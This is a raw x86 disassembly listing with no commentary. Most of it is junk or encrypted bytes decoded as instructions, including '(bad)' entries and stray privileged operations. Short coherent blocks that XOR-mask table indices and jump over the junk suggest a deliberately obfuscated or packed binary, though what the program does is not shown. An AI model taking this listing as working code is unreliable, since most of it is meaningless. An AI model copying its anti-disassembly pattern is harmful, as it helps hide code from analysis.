  4049e8:	pop    ds
  4049e9:	pop    edx
  4049ea:	bound  ebx,QWORD PTR ds:0x3fdc1bde
  4049f0:	pop    ebp
  4049f1:	jg     0x4049a4
  4049f3:	out    dx,eax
  4049f4:	cmp    ebx,DWORD PTR [ebp+0x480f42b1]
  4049fa:	stc    
  4049fb:	das    
  4049fc:	pop    edi
  4049fd:	shr    edi,cl
  4049ff:	xchg   ebx,eax
  404a00:	mov    bh,dh
  404a02:	inc    ebx
  404a03:	dec    ecx
  404a04:	jmp    0x4049f1
  404a06:	mov    ?,WORD PTR [ecx+ebx*1+0x34]
  404a0a:	pop    edi
  404a0b:	jo     0x404a67
  404a0d:	and    al,0x3e
  404a0f:	pop    ebp
  404a10:	jle    0x404a43
  404a12:	mov    ch,0xcc
  404a14:	pop    esi
  404a15:	aas    
  404a16:	pop    edi
  404a17:	fistp  WORD PTR [ecx+ecx*4+0x74]
  404a1b:	loope  0x404a87
  404a1d:	push   ebp
  404a1e:	ins    BYTE PTR es:[edi],dx
  404a1f:	lods   eax,DWORD PTR ds:[esi]
  404a20:	imul   esi,eax,0xffffffd7
  404a23:	sbb    dl,BYTE PTR [edi]
  404a25:	jcxz   0x404a33
  404a28:	or     eax,0x36bde229
  404a2d:	aad    0x4d
  404a2f:	add    eax,0x1883c956
  404a34:	xchg   ebx,eax
  404a35:	rcr    BYTE PTR [ecx],cl
  404a37:	or     ebp,DWORD PTR ds:0x10977ea9
  404a3d:	bound  edx,QWORD PTR [edi+eax*4+0x5f]
  404a41:	cmp    ebp,DWORD PTR [edx-0x54f2c127]
  404a47:	sub    BYTE PTR [ecx+0x23],0xf9
  404a4b:	loope  0x404a74
  404a4d:	jo     0x404a9d
  404a4f:	and    esp,DWORD PTR [esi+0x7514f775]
  404a55:	cmc    
  404a56:	(bad)  
  404a57:	jnp    0x404a9c
  404a59:	ss test eax,0x37e45fad
  404a5f:	jns    0x4049e8
  404a61:	pop    es
  404a62:	xchg   ecx,eax
  404a63:	bound  eax,QWORD PTR [ebx+0x44fe0158]
  404a69:	lock sub al,0x18
  404a6c:	ror    DWORD PTR [esi+0x48],1
  404a6f:	sbb    eax,0x39ccb1fe
  404a74:	xchg   esi,eax
  404a75:	or     eax,0x25772810
  404a7a:	cmp    al,bh
  404a7c:	mov    edx,0xdaeb1e93
  404a81:	jg     0x404a5e
  404a83:	jb     0x404ab3
  404a85:	jb     0x404a95
  404a87:	std    
  404a88:	and    bh,dh
  404a8a:	mov    dh,BYTE PTR [ebp+eax*2+0x709e3d0b]
  404a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a92:	repz or BYTE PTR [edx],ah
  404a95:	cmp    DWORD PTR [esi-0x23],edx
  404a98:	repz adc al,BYTE PTR [ebx-0x57]
  404a9c:	pop    ebx
  404a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a9e:	fiadd  WORD PTR [edx]
  404aa0:	sbb    dl,bl
  404aa2:	sbb    eax,0xc796ea92
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x7a3c6a28
  404b32:	push   ebx
  404b33:	push   0xffffffcd
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b6a
  404b3e:	imul   edx,esp,0x1080d4f
  404b44:	mov    ch,0xaa
  404b46:	(bad)  
  404b47:	fstp   TBYTE PTR [esi-0x3b]
  404b4a:	xor    eax,0xbeb6d8c7
  404b4f:	mov    ch,0x3e
  404b51:	xor    dl,BYTE PTR [edi-0x2b54867d]
  404b57:	loope  0x404b64
  404b59:	lahf   
  404b5a:	test   BYTE PTR [eax-0x78],bh
  404b5d:	inc    esi
  404b5e:	ret    
  404b5f:	and    al,0xdd
  404b61:	(bad)  
  404b63:	ins    DWORD PTR es:[edi],dx
  404b64:	lods   eax,DWORD PTR ds:[esi]
  404b65:	in     eax,0x8f
  404b67:	lea    esi,ds:0x478bd9
  404b6d:	lds    edi,FWORD PTR [eax+0x15]
  404b70:	adc    eax,0x79c012b0
  404b75:	ret    
  404b76:	sahf   
  404b77:	mov    WORD PTR [eax+edi*8-0x21],cs
  404b7b:	or     eax,0x3c800b63
  404b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b82:	push   cs
  404b83:	and    BYTE PTR [edi+0x52f6e0fc],ah
  404b89:	and    eax,eax
  404b8b:	addr16 push ebp
  404b8d:	dec    esi
  404b8e:	ja     0x404be2
  404b90:	push   ebp
  404b91:	inc    edx
  404b92:	push   edi
  404b93:	les    edi,FWORD PTR [edx+0x2e]
  404b96:	push   ecx
  404b97:	pop    esi
  404b98:	xor    ebx,DWORD PTR [eax+0x5c70ecd8]
  404b9e:	aad    0xa9
  404ba0:	mov    dh,0xac
  404ba2:	xor    DWORD PTR [edx],esp
  404ba4:	mov    eax,ds:0xd2841649
  404ba9:	pop    ebx
  404baa:	imul   edi,DWORD PTR [edx+0x70],0x18920be4
  404bb1:	out    dx,eax
  404bb2:	retf   
  404bb3:	call   0x1e04:0xddecb8be
  404bba:	ret    
  404bbb:	aas    
  404bbc:	mov    al,0x90
  404bbe:	cmp    DWORD PTR [edx],ecx
  404bc0:	jns    0x404b4d
  404bc2:	lock out 0x3d,eax
  404bc5:	btr    DWORD PTR [ebx],edi
  404bc8:	inc    ebx
  404bc9:	in     al,dx
  404bca:	dec    esp
  404bcb:	cmp    al,0xaf
  404bcd:	add    BYTE PTR [esi+0x58],bl
  404bd0:	ror    DWORD PTR [edi],1
  404bd2:	dec    edi
  404bd3:	or     eax,0xd9824182
  404bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd9:	pop    es
  404bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bdb:	push   ss
  404bdc:	sub    BYTE PTR [edx+0x13f5da5f],al
  404be2:	jns    0x404bbd
  404be4:	stc    
  404be5:	inc    ebx
  404be6:	adc    al,0xa4
  404be8:	lock cmp cl,BYTE PTR [esi]
  404beb:	push   ds
  404bec:	outs   dx,BYTE PTR ds:[esi]
  404bed:	stos   BYTE PTR es:[edi],al
  404bee:	jo     0x404c6f
  404bf0:	lods   al,BYTE PTR ds:[esi]
  404bf1:	xchg   BYTE PTR [ebx-0x40],ah
  404bf4:	pop    es
  404bf5:	pushf  
  404bf6:	enter  0xaa84,0x1
  404bfa:	jbe    0x404c54
  404bfc:	clc    
  404bfd:	scas   eax,DWORD PTR es:[edi]
  404bfe:	mov    esi,0x5c91437a
  404c03:	jbe    0x404bb8
  404c05:	stc    
  404c06:	pop    esi
  404c07:	and    eax,0x861eb084
  404c0c:	xchg   ecx,eax
  404c0d:	jg     0x404bb5
  404c0f:	test   eax,0x958a3d79
  404c14:	mov    dh,0x38
  404c16:	mov    eax,0x6568eb25
  404c1b:	ins    BYTE PTR es:[edi],dx
  404c1c:	lock mov edx,0x7c3d34e3
  404c22:	(bad)  
  404c23:	inc    ecx
  404c24:	pop    ss
  404c25:	icebp  
  404c26:	aaa    
  404c27:	fdivp  st(3),st
  404c29:	mov    dl,ch
  404c2b:	sbb    eax,0xb3d81200
  404c30:	and    BYTE PTR [ebp+0x2673e4fa],0x39
  404c37:	bound  edi,QWORD PTR [ecx]
  404c39:	ins    BYTE PTR es:[edi],dx
  404c3a:	cdq    
  404c3b:	shr    DWORD PTR ds:0xdd56cb98,0x75
  404c42:	js     0x404c85
  404c44:	cwde   
  404c45:	lock dec edx
  404c47:	xchg   BYTE PTR [ebx-0x6f],cl
  404c4a:	jmp    0xf0a:0x4f4a85ce
  404c51:	push   ebp
  404c52:	hlt    
  404c53:	sahf   
  404c54:	je     0x404bf0
  404c56:	push   ebx
  404c57:	mov    BYTE PTR [ecx],ah
  404c59:	arpl   WORD PTR [ebx-0x1a],dx
  404c5c:	mov    bl,0x2e
  404c5e:	sbb    edi,DWORD PTR [esi+0x40]
  404c61:	push   edx
  404c62:	cmp    al,BYTE PTR [esi+0x3f]
  404c65:	aas    
  404c66:	ins    BYTE PTR es:[edi],dx
  404c67:	loopne 0x404c40
  404c69:	mov    ch,0xec
  404c6b:	mov    ebp,DWORD PTR [edx]
  404c6d:	push   edi
  404c6e:	imul   esp,DWORD PTR [ecx+0x1765fafe],0xb0d0acdf
  404c78:	lods   al,BYTE PTR ds:[esi]
  404c79:	cmovge ecx,esp
  404c7c:	add    ebp,ebp
  404c7e:	jns    0x404c1a
  404c80:	fisttp WORD PTR [edi+edx*8]
  404c83:	add    DWORD PTR [ebp-0x33804db],eax
  404c89:	pop    esp
  404c8a:	jg     0x404c0f
  404c8c:	dec    ebp
  404c8d:	xor    DWORD PTR [eax],edi
  404c8f:	add    ecx,DWORD PTR [edi+0x7c]
  404c92:	cwde   
  404c93:	push   cs
  404c94:	inc    edi
  404c95:	push   ss
  404c96:	adc    al,0xf9
  404c98:	pop    ds
  404c99:	mov    al,0x98
  404c9b:	repnz xchg esp,eax
  404c9d:	mov    dl,BYTE PTR [eax]
  404c9f:	pop    ebx
  404ca0:	xchg   ecx,eax
  404ca1:	in     al,dx
  404ca2:	ja     0x404c99
  404ca4:	mov    bh,0xd5
  404ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca7:	jb     0x404c55
  404ca9:	ja     0x404c5b
  404cab:	(bad)  
  404cad:	sub    BYTE PTR [ebx+0x754e4c9c],cl
  404cb3:	jmp    0x1178d289
  404cb8:	add    eax,0x6a1b5bd2
  404cbd:	inc    esp
  404cbe:	xchg   esi,eax
  404cbf:	sub    BYTE PTR [ecx+0x27],dh
  404cc2:	mov    ds:0x69aa2617,al
  404cc7:	inc    edi
  404cc8:	add    DWORD PTR [edx],esp
  404cca:	std    
  404ccb:	sar    al,1
  404ccd:	push   cs
  404cce:	lods   al,BYTE PTR ds:[esi]
  404ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd0:	nop
  404cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd2:	out    0xe,al
  404cd4:	sub    edx,esp
  404cd6:	int3   
  404cd7:	jne    0x404cfd
  404cd9:	dec    edi
  404cda:	push   ebx
  404cdb:	cld    
  404cdc:	enter  0x9ed2,0xdb
  404ce0:	jp     0x404ce2
  404ce2:	sbb    al,BYTE PTR [esi+0x4d]
  404ce5:	mov    edx,0xb9e8732d
  404cea:	dec    ebx
  404ceb:	retf   0x5228
  404cee:	mov    ?,WORD PTR [edx+esi*8+0x5]
  404cf2:	pop    eax
  404cf3:	(bad)  
  404cf5:	cmp    BYTE PTR [ecx],al
  404cf7:	and    al,0xaf
  404cf9:	inc    eax
  404cfa:	fsubr  st(4),st
  404cfc:	jae    0x404d47
  404cfe:	outs   dx,BYTE PTR ds:[esi]
  404cff:	fs add al,0xe4
  404d02:	pop    edx
  404d03:	mov    eax,0x611271d
  404d08:	xchg   esi,eax
  404d09:	call   0xd711:0xae28459b
  404d10:	jmp    0x90322288
  404d15:	gs je  0x404cb1
  404d18:	fcmove st,st(7)
  404d1a:	int    0xd7
  404d1c:	xor    al,0x2f
  404d1e:	add    ah,BYTE PTR [edi+esi*8+0x76]
  404d22:	xor    ecx,ebx
  404d24:	pop    edi
  404d25:	ror    DWORD PTR ds:0xc6497d76,1
  404d2b:	dec    esi
  404d2c:	outs   dx,DWORD PTR ds:[esi]
  404d2d:	nop
  404d2e:	lea    ebp,[ebp+0x12]
  404d31:	pop    ss
  404d32:	or     esp,esp
  404d34:	mov    al,ds:0x8b85d286
  404d39:	xor    eax,0x6a7158fc
  404d3e:	inc    esi
  404d3f:	int3   
  404d40:	dec    esi
  404d41:	call   0x4f31:0x44868166
  404d48:	xchg   esi,eax
  404d49:	data16 jp 0x404d39
  404d4c:	es sahf 
  404d4e:	mov    ebp,0xfb80dfac
  404d53:	sbb    ebx,DWORD PTR [esi+0x5e0e499e]
  404d59:	ds xchg ebp,eax
  404d5b:	jb     0x404cfe
  404d5d:	imul   edx,DWORD PTR [ebp+esi*4-0x53],0xc400fe36
  404d65:	xchg   ecx,eax
  404d66:	xchg   ebx,eax
  404d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d68:	mov    eax,0xcd15ac48
  404d6d:	test   eax,0x108ddf4c
  404d72:	scas   al,BYTE PTR es:[edi]
  404d73:	jg     0x404d5a
  404d75:	test   BYTE PTR [ecx+ecx*4+0x59addac1],ah
  404d7c:	lock push ebx
  404d7e:	ja     0x404d2c
  404d80:	shl    BYTE PTR [eax-0x4c],1
  404d83:	into   
  404d84:	jmp    0x404d5e
  404d86:	push   esi
  404d87:	mov    ds:0x856af716,al
  404d8c:	mov    ch,0xed
  404d8e:	dec    ebx
  404d8f:	and    edi,ebx
  404d91:	inc    esi
  404d92:	mov    ds:0xf8edf57c,eax
  404d97:	popa   
  404d98:	in     eax,dx
  404d99:	jecxz  0x404d3d
  404d9b:	mov    esp,0xfb83143a
  404da0:	aad    0xca
  404da2:	push   cs
  404da3:	xor    BYTE PTR [edx+0x362e29c7],ah
  404da9:	into   
  404daa:	stos   BYTE PTR es:[edi],al
  404dab:	(bad)  
  404dac:	lods   al,BYTE PTR ds:[esi]
  404dad:	ret    0x3ba
  404db0:	mov    BYTE PTR [edi+0x21],bl
  404db3:	push   esp
  404db4:	add    DWORD PTR [ecx+0x6879bd82],esi
  404dba:	add    eax,0xf8c7e4a1
  404dbf:	gs in  eax,0xbc
  404dc2:	mov    al,ds:0xb2c41467
  404dc7:	adc    eax,edx
  404dc9:	adc    al,0x7
  404dcb:	jl     0x404dc6
  404dcd:	lods   al,BYTE PTR ds:[esi]
  404dce:	aas    
  404dcf:	(bad)  
  404dd0:	sahf   
  404dd1:	cmp    DWORD PTR [edx],esp
  404dd3:	adc    DWORD PTR [ecx*4+0x73e68286],esi
  404dda:	pusha  
  404ddb:	add    eax,0xffffffee
  404dde:	jne    0x404d96
  404de0:	iret   
  404de1:	add    ecx,esi
  404de3:	imul   edx,DWORD PTR [edi+0x7d],0xfffffff4
  404de7:	imul   eax,DWORD PTR [ebp+0x69069e7b],0xffffffb5
  404dee:	dec    esp
  404def:	mov    ebp,0xb8aa20bb
  404df4:	shl    BYTE PTR [ebx-0x33],1
  404df7:	cmp    DWORD PTR [ebx],0x4f
  404dfa:	cmc    
  404dfb:	cs dec esp
  404dfd:	lahf   
  404dfe:	xchg   edi,eax
  404dff:	out    0x89,eax
  404e01:	mov    ss,WORD PTR [edi]
  404e03:	mov    ecx,0x22e548c
  404e08:	inc    edi
  404e09:	mov    eax,0x59a12a33
  404e0e:	sbb    DWORD PTR [esi-0x31],esi
  404e11:	sbb    BYTE PTR ds:[esi-0x47],dh
  404e15:	das    
  404e16:	lea    ebp,[edx]
  404e18:	aam    0x6c
  404e1a:	jo     0x404e40
  404e1c:	jns    0x404df1
  404e1e:	shr    BYTE PTR [eax+ecx*1+0x7c],0x9c
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e23
  404e5e:	scas   al,BYTE PTR es:[edi]
  404e5f:	test   al,0x79
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e00
  404e6a:	jge    0x404e89
  404e6c:	jae    0x404eb4
  404e6e:	hlt    
  404e6f:	lea    ebx,[ecx]
  404e71:	inc    eax
  404e72:	push   edi
  404e73:	fs scas al,BYTE PTR es:[edi]
  404e75:	adc    ebx,ecx
  404e77:	mov    ds:0x21ea021c,al
  404e7c:	jns    0x404e5f
  404e7e:	push   edi
  404e7f:	cmp    DWORD PTR [ebp-0x36339840],edx
  404e85:	mov    bh,0x78
  404e87:	inc    esp
  404e88:	pop    es
  404e89:	add    ah,bl
  404e8b:	je     0x404ed5
  404e8d:	fisttp QWORD PTR [ecx-0x50]
  404e90:	call   0xd4fc214
  404e95:	cmp    ch,BYTE PTR gs:[eax+edx*8-0x1d]
  404e9a:	mov    ds:0xd06c2c2a,al
  404e9f:	and    DWORD PTR [eax+0x515a6192],ebx
  404ea5:	imul   edx,DWORD PTR [ecx],0x4e
  404ea8:	add    edx,DWORD PTR [ecx]
  404eaa:	lock or BYTE PTR [ebx+0x38da6029],dl
  404eb1:	rcr    BYTE PTR [edi],0x9c
  404eb4:	mov    ebx,0x84176937
  404eb9:	iret   
  404eba:	xchg   edx,eax
  404ebb:	sbb    eax,0x645f3f6f
  404ec0:	and    edx,DWORD PTR [eax+0x4c747068]
  404ec6:	fst    st(2)
  404ec8:	cmp    eax,0xee99d2df
  404ecd:	out    dx,al
  404ece:	mov    edx,0xa2b6084d
  404ed3:	daa    
  404ed4:	inc    ebx
  404ed5:	stc    
  404ed6:	xchg   ebp,eax
  404ed7:	lock std 
  404ed9:	inc    edi
  404eda:	test   eax,0x833d2a8
  404edf:	rcl    esp,0xb4
  404ee2:	inc    esi
  404ee3:	sbb    ah,BYTE PTR [ebp-0xd]
  404ee6:	xor    al,0x84
  404ee8:	not    BYTE PTR [edi+0x72ceda2f]
  404eee:	dec    ecx
  404eef:	ret    0x4ea0
  404ef2:	cmp    eax,0xa0b87ee6
  404ef7:	pop    ds
  404ef8:	sbb    BYTE PTR [eax+0x14ed4ea1],ch
  404efe:	jae    0x404ede
  404f00:	ret    0xd7f
  404f03:	mov    eax,ds:0xb19f993c
  404f08:	(bad)  
  404f09:	int3   
  404f0a:	sar    DWORD PTR [ebp+ebp*1+0xa],0x87
  404f0f:	mov    dh,0x4f
  404f11:	cmc    
  404f12:	adc    eax,esi
  404f14:	cmp    BYTE PTR [esi+ecx*8],bh
  404f17:	stos   DWORD PTR es:[edi],eax
  404f18:	arpl   ax,bp
  404f1a:	pop    ds
  404f1b:	mov    ah,0x1d
  404f1d:	(bad)  [edi+0x66d54e3d]
  404f23:	jg     0x404eb2
  404f25:	outs   dx,DWORD PTR ds:[esi]
  404f26:	and    ebp,ebx
  404f28:	es icebp 
  404f2a:	jp     0x404ec8
  404f2c:	arpl   WORD PTR [edx+0x22],sp
  404f2f:	mov    BYTE PTR [esi+0x415b315b],cl
  404f35:	add    eax,0xd830e0f4
  404f3a:	adc    eax,0xbe4639b7
  404f3f:	and    edi,ebx
  404f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f42:	add    eax,0xfa4a14fe
  404f47:	arpl   WORD PTR [esi+0x2e363c53],di
  404f4d:	mov    es,WORD PTR [eax-0x72ac237]
  404f53:	aaa    
  404f54:	xor    BYTE PTR [ecx+0x4982c4eb],cl
  404f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f5b:	aad    0xaa
  404f5d:	inc    esi
  404f5e:	or     ah,BYTE PTR [eax+eiz*8]
  404f61:	test   BYTE PTR ds:[edi+0x2970f4d1],bh
  404f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f69:	or     DWORD PTR [edi-0x411ee9ea],edx
  404f6f:	sub    DWORD PTR [ecx+0x4ef35a6f],esi
  404f75:	jbe    0x404fd2
  404f77:	hlt    
  404f78:	or     DWORD PTR [esi],esi
  404f7a:	mov    dh,0xe2
  404f7c:	and    ebp,DWORD PTR es:[ebp+0x585c88cc]
  404f83:	xchg   ebp,eax
  404f84:	cmp    DWORD PTR [esp+ebx*8-0x20],ebx
  404f88:	jmp    0xdf67:0x4a8eb47
  404f8f:	gs icebp 
  404f91:	push   esp
  404f92:	fcomi  st,st(1)
  404f94:	in     eax,0x59
  404f96:	icebp  
  404f97:	enter  0x67ab,0x4d
  404f9b:	je     0x404fcc
  404f9d:	mov    edx,0xc0c5227a
  404fa2:	(bad)  
  404fa3:	popf   
  404fa4:	pop    ecx
  404fa5:	dec    ebx
  404fa6:	pop    edi
  404fa7:	ja     0x40500d
  404fa9:	sbb    DWORD PTR [esi],esi
  404fab:	jnp    0x404fc5
  404fad:	or     eax,0xcf4d2220
  404fb2:	outs   dx,DWORD PTR ds:[esi]
  404fb3:	call   0xca6e:0x2ce50f3d
  404fba:	in     al,0xad
  404fbc:	int    0x19
  404fbe:	xchg   ebp,eax
  404fbf:	mov    dl,0xbe
  404fc1:	adc    al,0x21
  404fc3:	mov    BYTE PTR [esi],bl
  404fc5:	sahf   
  404fc6:	xchg   edx,eax
  404fc7:	xor    esi,DWORD PTR [ebp-0x33]
  404fca:	mov    ebx,0xdd027f8a
  404fcf:	sbb    al,0x17
  404fd1:	sbb    eax,0x926c99f1
  404fd6:	sbb    esi,DWORD PTR ds:0xc33bbc34
  404fdc:	push   esi
  404fdd:	test   eax,0xa56a0e17
  404fe2:	call   0xec58:0x53680200
  404fe9:	or     DWORD PTR [ecx+0x7c],eax
  404fec:	ucomiss xmm7,DWORD PTR [ebx-0x1cb90803]
  404ff3:	cmp    bh,dh
  404ff5:	std    
  404ff6:	paddb  mm7,mm5
  404ff9:	cwde   
  404ffa:	sti    
  404ffb:	jne    0x404f88
  404ffd:	and    DWORD PTR [ebx-0x3e],ebx
  405000:	mov    al,ds:0x43792b23
  405005:	ror    DWORD PTR [ebp-0x76a820d9],0xd5
  40500c:	and    eax,0x7d4292a2
  405011:	cs sub cl,ah
  405014:	jg     0x404fd7
  405016:	stos   BYTE PTR es:[edi],al
  405017:	cmp    ebx,0xffffff8c
  40501a:	out    dx,eax
  40501b:	add    DWORD PTR [edx-0x50bc178d],eax
  405021:	push   edi
  405022:	cmp    eax,0x80fe8baa
  405027:	(bad)  
  405028:	je     0x40501b
  40502a:	stc    
  40502b:	inc    ecx
  40502c:	cmp    ecx,edx
  40502e:	rol    DWORD PTR [edi+0x3d],cl
  405031:	js     0x40502e
  405033:	lock pop ds
  405035:	and    al,0x49
  405037:	mov    eax,0xcbe318bf
  40503c:	shr    BYTE PTR [edx-0x7b446821],cl
  405042:	xchg   ebp,eax
  405043:	lea    ecx,[ebp+0x6963f6f3]
  405049:	pop    es
  40504a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40504b:	hlt    
  40504c:	out    dx,al
  40504d:	fstp   QWORD PTR [edx+eax*4+0x4f]
  405051:	xor    edi,DWORD PTR [edx+edx*2+0x5f]
  405055:	in     al,0xba
  405057:	xor    BYTE PTR [edi+ebp*1],cl
  40505a:	cdq    
  40505b:	push   0x3ca5f9f8
  405060:	clc    
  405061:	sar    BYTE PTR [ebp*4+0x6651dc23],0xce
  405069:	(bad)  
  40506a:	add    bh,BYTE PTR [edx-0x3c]
  40506d:	jne    0x405014
  40506f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405070:	outs   dx,BYTE PTR ds:[esi]
  405071:	(bad)  
  405073:	arpl   WORD PTR [esi-0x1c6a0b07],si
  405079:	push   ds
  40507a:	push   esi
  40507b:	daa    
  40507c:	jge    0x4050e1
  40507e:	push   ebp
  40507f:	(bad)  
  405080:	pusha  
  405081:	push   0xa23e0400
  405086:	or     eax,0x44d5a58e
  40508b:	je     0x405044
  40508d:	and    BYTE PTR [ecx],ah
  40508f:	fwait
  405090:	sbb    BYTE PTR [esi+0x29],ch
  405093:	cmc    
  405094:	outs   dx,DWORD PTR ds:[esi]
  405095:	push   ebp
  405096:	jp     0x405019
  405098:	and    al,0x7f
  40509a:	and    ecx,DWORD PTR ds:0x79a29b64
  4050a0:	pop    esi
  4050a1:	or     al,0x46
  4050a3:	fwait
  4050a4:	mov    edx,0x5983a66d
  4050a9:	mov    ebx,0x7817749c
  4050ae:	arpl   WORD PTR [edx],cx
  4050b0:	xchg   esi,eax
  4050b1:	fld    TBYTE PTR [eax]
  4050b3:	sbb    BYTE PTR [edi+0x43d7c330],0xa9
  4050ba:	cmp    eax,DWORD PTR [edx+0x2e]
  4050bd:	mov    al,ds:0x75cb133c
  4050c2:	add    cl,BYTE PTR [eax+ebx*8-0x69]
  4050c6:	or     DWORD PTR [esi-0x6b7e8fe5],esi
  4050cc:	adc    DWORD PTR [edi],ebp
  4050ce:	(bad)  
  4050cf:	lock sub ah,ch
  4050d2:	xchg   esp,eax
  4050d3:	xchg   edi,eax
  4050d4:	and    DWORD PTR [edi],ecx
  4050d6:	imul   ebp,eax,0x9868247e
  4050dc:	xor    al,0xcf
  4050de:	add    BYTE PTR [ebp+0x68],al
  4050e1:	mov    ah,0xc8
  4050e3:	xor    BYTE PTR [ecx],0x3d
  4050e6:	add    DWORD PTR [edx],0x1
  4050e9:	adc    DWORD PTR [eax],edi
  4050eb:	xor    al,BYTE PTR [edx+0x2a2bacdc]
  4050f1:	enter  0x7d1a,0xc0
  4050f5:	push   edi
  4050f6:	retf   0xe287
  4050f9:	mov    ds:0xd6bd8762,eax
  4050fe:	in     eax,dx
  4050ff:	xor    DWORD PTR [esi+edx*2-0x143af07e],0xffffff88
  405107:	(bad)  
  405108:	mov    edx,0xf19e7903
  40510d:	inc    ebx
  40510e:	or     BYTE PTR [esi],al
  405110:	lock inc edx
  405112:	int    0x8a
  405114:	jbe    0x405105
  405116:	les    ebx,FWORD PTR [ecx+0x7d]
  405119:	jnp    0x40515a
  40511b:	leave  
  40511c:	icebp  
  40511d:	mov    ecx,DWORD PTR [ecx]
  40511f:	xor    ecx,ebp
  405121:	or     BYTE PTR [esi],al
  405123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405124:	and    al,0xd5
  405126:	sub    cl,dh
  405128:	sbb    dl,BYTE PTR [edx-0x46d71128]
  40512e:	inc    esi
  40512f:	test   BYTE PTR [ebx],cl
  405131:	(bad)  
  405132:	mov    BYTE PTR [eax+0x2c],ah
  405135:	dec    ecx
  405136:	(bad)  
  405137:	cli    
  405138:	or     ebx,DWORD PTR ds:0x5400e939
  40513e:	add    BYTE PTR [ecx-0x5b],ch
  405141:	push   ss
  405142:	cmp    al,0xb1
  405144:	inc    ebp
  405145:	call   0x14ac1cef
  40514a:	sbb    al,0xd4
  40514c:	adc    edi,esp
  40514e:	ja     0x40515f
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	jmp    0x7e2c:0xf613be2c
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405104
  40517e:	lods   al,BYTE PTR ds:[esi]
  40517f:	sub    esp,edi
  405181:	jmp    0x4051c9
  405183:	(bad)  
  405184:	arpl   WORD PTR [ebp+0x2c],bx
  405187:	out    0xd3,al
  405189:	cli    
  40518a:	mov    bh,0x52
  40518c:	dec    edi
  40518d:	lahf   
  40518e:	inc    esp
  40518f:	cwde   
  405190:	(bad)  
  405191:	in     eax,0xc0
